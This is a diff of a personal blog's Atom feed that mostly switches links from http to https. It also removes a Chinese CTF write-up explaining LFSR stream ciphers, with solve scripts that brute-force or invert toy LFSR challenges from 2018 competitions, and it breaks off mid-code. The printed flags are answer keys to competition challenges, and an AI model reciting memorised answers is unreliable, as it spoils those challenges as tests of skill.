-    <link href="http://igml.top/2020/06/29/2020-TCTF-0CTF/"/>
-    <id>http://igml.top/2020/06/29/2020-TCTF-0CTF/</id>
+    <link href="https://igml.top/2020/06/29/2020-TCTF-0CTF/"/>
+    <id>https://igml.top/2020/06/29/2020-TCTF-0CTF/</id>
     <published>2020-06-29T09:05:18.000Z</published>
     <updated>2020-07-10T14:15:26.607Z</updated>
     
@@ -229,21 +256,21 @@
     
     
     
-    <category term="CTF" scheme="http://igml.top/categories/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
     
-    <category term="Web" scheme="http://igml.top/categories/CTF/Web/"/>
+    <category term="Web" scheme="https://igml.top/categories/CTF/Web/"/>
     
     
-    <category term="CTF" scheme="http://igml.top/tags/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
     
-    <category term="wp" scheme="http://igml.top/tags/wp/"/>
+    <category term="wp" scheme="https://igml.top/tags/wp/"/>
     
   </entry>
   
   <entry>
     <title>2020 第五空间智能安全大赛初赛wp</title>
-    <link href="http://igml.top/2020/06/25/2020-5space/"/>
-    <id>http://igml.top/2020/06/25/2020-5space/</id>
+    <link href="https://igml.top/2020/06/25/2020-5space/"/>
+    <id>https://igml.top/2020/06/25/2020-5space/</id>
     <published>2020-06-25T10:27:34.000Z</published>
     <updated>2020-06-25T11:02:00.609Z</updated>
     
@@ -255,21 +282,21 @@
     
     
     
-    <category term="CTF" scheme="http://igml.top/categories/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
     
-    <category term="Web" scheme="http://igml.top/categories/CTF/Web/"/>
+    <category term="Web" scheme="https://igml.top/categories/CTF/Web/"/>
     
     
-    <category term="CTF" scheme="http://igml.top/tags/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
     
-    <category term="Web" scheme="http://igml.top/tags/Web/"/>
+    <category term="Web" scheme="https://igml.top/tags/Web/"/>
     
   </entry>
   
   <entry>
     <title>2020网鼎杯-朱雀组wp</title>
-    <link href="http://igml.top/2020/05/18/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80/"/>
-    <id>http://igml.top/2020/05/18/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80/</id>
+    <link href="https://igml.top/2020/05/18/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80/"/>
+    <id>https://igml.top/2020/05/18/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80/</id>
     <published>2020-05-18T02:58:26.000Z</published>
     <updated>2020-05-18T16:29:40.503Z</updated>
     
@@ -280,25 +307,25 @@
     
     
     
-    <category term="CTF" scheme="http://igml.top/categories/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
     
-    <category term="Web" scheme="http://igml.top/categories/CTF/Web/"/>
+    <category term="Web" scheme="https://igml.top/categories/CTF/Web/"/>
     
-    <category term="Crypto" scheme="http://igml.top/categories/CTF/Web/Crypto/"/>
+    <category term="Crypto" scheme="https://igml.top/categories/CTF/Web/Crypto/"/>
     
     
-    <category term="CTF" scheme="http://igml.top/tags/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
     
-    <category term="Crypto" scheme="http://igml.top/tags/Crypto/"/>
+    <category term="Crypto" scheme="https://igml.top/tags/Crypto/"/>
     
-    <category term="Web" scheme="http://igml.top/tags/Web/"/>
+    <category term="Web" scheme="https://igml.top/tags/Web/"/>
     
   </entry>
   
   <entry>
     <title>2020网鼎杯-青龙组wp</title>
-    <link href="http://igml.top/2020/05/13/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99/"/>
-    <id>http://igml.top/2020/05/13/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99/</id>
+    <link href="https://igml.top/2020/05/13/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99/"/>
+    <id>https://igml.top/2020/05/13/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99/</id>
     <published>2020-05-13T02:25:37.000Z</published>
     <updated>2020-05-18T02:57:35.719Z</updated>
     
@@ -309,21 +336,21 @@
     
     
     
-    <category term="CTF" scheme="http://igml.top/categories/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
     
-    <category term="Web" scheme="http://igml.top/categories/CTF/Web/"/>
+    <category term="Web" scheme="https://igml.top/categories/CTF/Web/"/>
     
     
-    <category term="CTF" scheme="http://igml.top/tags/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
     
-    <category term="Web" scheme="http://igml.top/tags/Web/"/>
+    <category term="Web" scheme="https://igml.top/tags/Web/"/>
     
   </entry>
   
   <entry>
     <title>2020 Codegate Web题解</title>
-    <link href="http://igml.top/2020/02/10/2020-Codegate/"/>
-    <id>http://igml.top/2020/02/10/2020-Codegate/</id>
+    <link href="https://igml.top/2020/02/10/2020-Codegate/"/>
+    <id>https://igml.top/2020/02/10/2020-Codegate/</id>
     <published>2020-02-10T08:19:09.000Z</published>
     <updated>2020-02-24T03:18:01.434Z</updated>
     
@@ -338,21 +365,21 @@
     
     
     
-    <category term="CTF" scheme="http://igml.top/categories/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
     
-    <category term="Web" scheme="http://igml.top/categories/CTF/Web/"/>
+    <category term="Web" scheme="https://igml.top/categories/CTF/Web/"/>
     
     
-    <category term="CTF" scheme="http://igml.top/tags/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
     
-    <category term="Web" scheme="http://igml.top/tags/Web/"/>
+    <category term="Web" scheme="https://igml.top/tags/Web/"/>
     
   </entry>
   
   <entry>
     <title>36c3 一道Web&amp;Crypto题</title>
-    <link href="http://igml.top/2020/01/08/2019-36c3/"/>
-    <id>http://igml.top/2020/01/08/2019-36c3/</id>
+    <link href="https://igml.top/2020/01/08/2019-36c3/"/>
+    <id>https://igml.top/2020/01/08/2019-36c3/</id>
     <published>2020-01-08T14:00:19.000Z</published>
     <updated>2020-01-09T06:45:06.261Z</updated>
     
@@ -363,23 +390,23 @@
     
     
     
-    <category term="CTF" scheme="http://igml.top/categories/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
     
-    <category term="Web" scheme="http://igml.top/categories/CTF/Web/"/>
+    <category term="Web" scheme="https://igml.top/categories/CTF/Web/"/>
     
     
-    <category term="CTF" scheme="http://igml.top/tags/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
     
-    <category term="Crypto" scheme="http://igml.top/tags/Crypto/"/>
+    <category term="Crypto" scheme="https://igml.top/tags/Crypto/"/>
     
-    <category term="Web" scheme="http://igml.top/tags/Web/"/>
+    <category term="Web" scheme="https://igml.top/tags/Web/"/>
     
   </entry>
   
   <entry>
     <title>2019 XCTF FINALS weiphp5.0 漏洞挖掘</title>
-    <link href="http://igml.top/2019/10/30/weiphp5-0/"/>
-    <id>http://igml.top/2019/10/30/weiphp5-0/</id>
+    <link href="https://igml.top/2019/10/30/weiphp5-0/"/>
+    <id>https://igml.top/2019/10/30/weiphp5-0/</id>
     <published>2019-10-30T06:24:57.000Z</published>
     <updated>2019-10-30T10:58:55.788Z</updated>
     
@@ -391,14 +418,14 @@
     
     
     
-    <category term="Web" scheme="http://igml.top/tags/Web/"/>
+    <category term="Web" scheme="https://igml.top/tags/Web/"/>
     
   </entry>
   
   <entry>
     <title>hexo图片外链被限制解决方法</title>
-    <link href="http://igml.top/2019/10/29/hexo%E5%9B%BE%E7%89%87%E5%A4%96%E9%93%BE%E8%A2%AB%E9%99%90%E5%88%B6%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
-    <id>http://igml.top/2019/10/29/hexo%E5%9B%BE%E7%89%87%E5%A4%96%E9%93%BE%E8%A2%AB%E9%99%90%E5%88%B6%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</id>
+    <link href="https://igml.top/2019/10/29/hexo%E5%9B%BE%E7%89%87%E5%A4%96%E9%93%BE%E8%A2%AB%E9%99%90%E5%88%B6%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
+    <id>https://igml.top/2019/10/29/hexo%E5%9B%BE%E7%89%87%E5%A4%96%E9%93%BE%E8%A2%AB%E9%99%90%E5%88%B6%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</id>
     <published>2019-10-29T12:03:55.000Z</published>
     <updated>2019-10-29T12:23:23.164Z</updated>
     
@@ -410,14 +437,14 @@
     
     
     
-    <category term="解决方法" scheme="http://igml.top/tags/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
+    <category term="解决方法" scheme="https://igml.top/tags/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
     
   </entry>
   
   <entry>
     <title>2019 de1ctf</title>
-    <link href="http://igml.top/2019/08/04/2019-de1ctf/"/>
-    <id>http://igml.top/2019/08/04/2019-de1ctf/</id>
+    <link href="https://igml.top/2019/08/04/2019-de1ctf/"/>
+    <id>https://igml.top/2019/08/04/2019-de1ctf/</id>
     <published>2019-08-04T15:18:47.000Z</published>
     <updated>2019-10-29T11:44:42.874Z</updated>
     
@@ -429,18 +456,18 @@
     
     
     
-    <category term="CTF" scheme="http://igml.top/tags/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
     
-    <category term="Web" scheme="http://igml.top/tags/Web/"/>
+    <category term="Web" scheme="https://igml.top/tags/Web/"/>
     
-    <category term="wp" scheme="http://igml.top/tags/wp/"/>
+    <category term="wp" scheme="https://igml.top/tags/wp/"/>
     
   </entry>
   
   <entry>
     <title>2019 强网杯 wp</title>
-    <link href="http://igml.top/2019/05/27/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF-wp/"/>
-    <id>http://igml.top/2019/05/27/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF-wp/</id>
+    <link href="https://igml.top/2019/05/27/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF-wp/"/>
+    <id>https://igml.top/2019/05/27/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF-wp/</id>
     <published>2019-05-27T05:26:23.000Z</published>
     <updated>2019-10-29T11:44:11.934Z</updated>
     
@@ -453,21 +480,21 @@
     
     
     
-    <category term="CTF" scheme="http://igml.top/categories/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
     
     
-    <category term="CTF" scheme="http://igml.top/tags/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
     
-    <category term="Web" scheme="http://igml.top/tags/Web/"/>
+    <category term="Web" scheme="https://igml.top/tags/Web/"/>
     
-    <category term="wp" scheme="http://igml.top/tags/wp/"/>
+    <category term="wp" scheme="https://igml.top/tags/wp/"/>
     
   </entry>
   
   <entry>
     <title>2019 0CTF</title>
-    <link href="http://igml.top/2019/03/28/2019-0CTF/"/>
-    <id>http://igml.top/2019/03/28/2019-0CTF/</id>
+    <link href="https://igml.top/2019/03/28/2019-0CTF/"/>
+    <id>https://igml.top/2019/03/28/2019-0CTF/</id>
     <published>2019-03-28T05:26:23.000Z</published>
     <updated>2019-10-29T11:44:31.193Z</updated>
     
@@ -479,35 +506,12 @@
     
     
     
-    <category term="CTF" scheme="http://igml.top/categories/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
     
     
-    <category term="CTF" scheme="http://igml.top/tags/CTF/"/>
+    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
     
-    <category term="Web" scheme="http://igml.top/tags/Web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>CTF 中的 LFSR</title>
-    <link href="http://igml.top/2018/12/21/CTF%E4%B8%AD%E7%9A%84LFSR/"/>
-    <id>http://igml.top/2018/12/21/CTF%E4%B8%AD%E7%9A%84LFSR/</id>
-    <published>2018-12-21T09:01:45.000Z</published>
-    <updated>2019-10-29T11:45:18.132Z</updated>
-    
-    <content type="html"><![CDATA[<p>线性反馈移位寄存器（LFSR）在流密码中有广泛的应用，是指给定前一状态的输出，将该输出的线性函数再用作输入的移位寄存器。LFSR 主要用于生成一串随机的比特流，比特流可用做加密明文的密钥。</p><p>LFSR 基本原理大致就是通过当前状态进行一些线性运算来确定下一状态。不清楚的可以参考<a href="https://zhuanlan.zhihu.com/p/33920501">这篇文章</a>学习一下流密码和 LFSR 。</p><p>最开始接触 LFSR 是在强网杯的 streamgame，后来密码学课程上比较详细学习了流密码和 LFSR，再到今年国赛初赛中的 oldstream，最近的 X-MAS CTF 中一道密码题我看到了 LFSR 的一些新玩法，总结一下。</p><a id="more"></a><h3 id="2018-强网杯-streamgame1"><a href="#2018-强网杯-streamgame1" class="headerlink" title="2018 强网杯 streamgame1"></a>2018 强网杯 streamgame1</h3><p>看一下题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&quot;flag&#123;&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> flag.endswith(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag)==<span class="number">25</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span>(<span class="params">R,mask</span>):</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    output^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (output,lastbit)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">R=<span class="built_in">int</span>(flag[<span class="number">5</span>:<span class="number">-1</span>],<span class="number">2</span>)</span><br><span class="line">mask    =   <span class="number">0b1010011000100011100</span></span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;ab&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    tmp=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        (R,out)=lfsr(R,mask)</span><br><span class="line">        tmp=(tmp &lt;&lt; <span class="number">1</span>)^out</span><br><span class="line">    f.write(<span class="built_in">chr</span>(tmp))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>可以发现 flag 是 19 位比特流，作为 LFSR 的初始状态，生成了 96 个比特并写入了 key 中。这里 2**19 时间复杂度并不大，直接采用暴力枚举的方式，脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span>(<span class="params">R,mask</span>):</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    output^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (output,lastbit)</span><br><span class="line"></span><br><span class="line">key=[<span class="number">85</span>,<span class="number">56</span>,<span class="number">247</span>,<span class="number">66</span>,<span class="number">193</span>,<span class="number">13</span>,<span class="number">178</span>,<span class="number">199</span>,<span class="number">237</span>,<span class="number">224</span>,<span class="number">36</span>,<span class="number">58</span>]</span><br><span class="line">mask=<span class="number">0b1010011000100011100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">19</span>):</span><br><span class="line">    R=k;</span><br><span class="line">    a=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    judge=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">        tmp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            (k, out) = lfsr(k, mask)</span><br><span class="line">            tmp = (tmp &lt;&lt; <span class="number">1</span>) ^ out</span><br><span class="line">        <span class="keyword">if</span>(key[i]!=tmp):</span><br><span class="line">           judge=<span class="number">0</span></span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span>(judge==<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;flag&#123;&#x27;</span>+<span class="built_in">bin</span>(R)[<span class="number">2</span>:]+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>结果： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1110101100001101011&#125;</span><br></pre></td></tr></table></figure><h3 id="2018-国赛-oldstreamgame"><a href="#2018-国赛-oldstreamgame" class="headerlink" title="2018 国赛 oldstreamgame"></a>2018 国赛 oldstreamgame</h3><p>看一下题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;flag&#123;xxxxxxxxxxxxxxxx&#125;&quot;</span></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&quot;flag&#123;&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> flag.endswith(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag)==<span class="number">14</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span>(<span class="params">R,mask</span>):</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    output^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (output,lastbit)</span><br><span class="line"></span><br><span class="line">R=<span class="built_in">int</span>(flag[<span class="number">5</span>:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">mask = <span class="number">0b10100100000010000000100010010100</span></span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    tmp=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        (R,out)=lfsr(R,mask)</span><br><span class="line">        tmp=(tmp &lt;&lt; <span class="number">1</span>)^out</span><br><span class="line">    f.write(<span class="built_in">chr</span>(tmp))</span><br><span class="line">f.close()python</span><br></pre></td></tr></table></figure><p>同样是一个 LFSR，与之前不同的是 flag 是 8 位十六进制，也就是 LFSR 初始状态是 32 bit，这里我们也可以采用暴力枚举的方式，但是更好的方式是分析一下原理。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>我们仔细分析一下 <code>lfsr</code> 这个函数的作用：</p><p>函数传入 R 和 mask 两个参数，output 由 R 左移一位然后和 0xffffffff 进行了与操作得到，相当于把原来 R 的最高比特位顶掉了，末尾填了一个 0 。i 是由 R 和 mask 进行了与操作，后面的循环主要用于得到 lastbit。</p><p>lastbit 首先为 0， 然后 lastbit 和 i &amp;1 的结果异或，i 右移一位，以此类推，知道 i 为 0，不难分析出 lastbit 实际就是 i 的每个比特位异或得到的。在循环结束后 output 和 lastbit 进行了异或，由于之前 output 的最低比特是 0，所以相当于把 output 的最低位设成了 lastbit。函数返回 output 和 lastbit 返回。</p><p>总结一下 lfsr 这个函数：</p><p><strong>对于传入的 R 和 mask，R 左移一位把最高位顶掉，最低一位由 R &amp; mask 结果的各个比特位异或的结果进行填充。并返回最终结果和最低位。</strong></p><p>可以看到这就是一个典型的线性反馈移位寄存器的实现，初始状态是 flag 的 32 比特位，随后不断顶掉高位，在最后一位填充。可以想象成一个长度为 32 的队列，每一次队列向前移动，最前面（最高位）的出去，后面填充的由前一状态的 32 个比特经过运算决定（具体就是 lastbit 的生成方法）。</p><p>我们看一下 lastbit 的生成方法，R 和 mask 进行与操作，mask 是 <code>0b10100100000010000000100010010100</code>,和 0 进行与操作肯定是 0，所以实际上 R 只有几个比特位起作用，就是 mask 为 1 的那些 bit 位。也就是说 R 的这些位异或得到了 lastbit。</p><p>这个 LFSR 当生成了第一个比特时，flag 最初始的 32 比特最高比特被顶出去了，生成第二个比特时，原始状态的第二高位被顶出去了。我们不妨想一下当生成第 32 个比特结束后，此时的状态就是 flag 最初始的 32 比特完全都被顶出去了。而这 32 个比特我们都已知（程序每次都把 lastbit 记录写进了 key 中）。此时状态的 32 个比特的最低位是由上一状态的 32 比特起作用的那些位异或得到的，而 mask 的最高位是 1，所以也就是上一个状态的最高位参与了异或运算，而上一个状态最高位就是被顶出去的 flag 初始状态的最低一位，此外我们可以得到参与异或运算的其他比特位，那么我们就可以算出初始状态的最低位了。</p><p>用式子来说明，把开始生成第 32 比特的状态比作 x，x[i] 代表从高到低的第几位，那么：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lastbit &#x3D; x[1] ^ x[3] ^ x[6] ^ x[13] ^ x[21] ^ x[25] ^ x[28] ^ x[30]</span><br></pre></td></tr></table></figure><p>lastbit 代表生成的第 32 个比特，x[1] 代表<strong>初始状态的最低比特位</strong>，这个式子中只有 x[1] 未知，我们可以计算出 x[1],这样我们就可以通过生成第 32 个比特后的状态还原了生成第 31 个比特后（生成第 32 个比特前）的状态，以此类推，经过 32 次我们可以完全还原到初始状态。</p><p>原理简单来说就是新生成的比特是通过上一个状态的特定比特异或得到，我们可以利用异或性质用生成的比特去还原原来的比特。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>根据思路写出解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LFSR_inv</span>(<span class="params">R,mask</span>):</span></span><br><span class="line">    <span class="built_in">str</span>=<span class="built_in">bin</span>(R)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">    new=<span class="built_in">str</span>[<span class="number">-1</span>:]+<span class="built_in">str</span>[:<span class="number">-1</span>]</span><br><span class="line">    new=<span class="built_in">int</span>(new,<span class="number">2</span>)                    <span class="comment">#R循环右移一位得到new</span></span><br><span class="line">    i = (new &amp; mask) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    lastbit = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">        lastbit ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">        i = i &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> R&gt;&gt;<span class="number">1</span> | lastbit&lt;&lt;<span class="number">31</span>         <span class="comment">#最高位用lastbit填充</span></span><br><span class="line"></span><br><span class="line">mask = <span class="number">0b10100100000010000000100010010100</span></span><br><span class="line">data=<span class="built_in">open</span>(<span class="string">&#x27;key&#x27;</span>).read()</span><br><span class="line">data=data[:<span class="number">4</span>]</span><br><span class="line">c=libnum.s2n(data)                    <span class="comment">#生成32比特后的状态</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    c=LFSR_inv(c,mask)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(c)</span><br></pre></td></tr></table></figure><p>运行得到结果：0x926201d7L</p><p>所以 flag 是</p><blockquote><p>flag{926201d7}</p></blockquote><h3 id="2018-X-MAS-CTF-goodies"><a href="#2018-X-MAS-CTF-goodies" class="headerlink" title="2018 X-MAS CTF goodies"></a>2018 X-MAS CTF goodies</h3><p>这个题算是一个 LFSR 的变形，感觉考的很有趣。看下题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PRNG</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.seed = self.getseed()</span><br><span class="line">        self.iv = <span class="built_in">int</span>(<span class="built_in">bin</span>(self.seed)[<span class="number">2</span>:].zfill(<span class="number">64</span>)[<span class="number">0</span>:<span class="number">32</span>], <span class="number">2</span>)</span><br><span class="line">        self.key = <span class="built_in">int</span>(<span class="built_in">bin</span>(self.seed)[<span class="number">2</span>:].zfill(<span class="number">64</span>)[<span class="number">32</span>:<span class="number">64</span>], <span class="number">2</span>)</span><br><span class="line">        self.mask = <span class="built_in">int</span>(<span 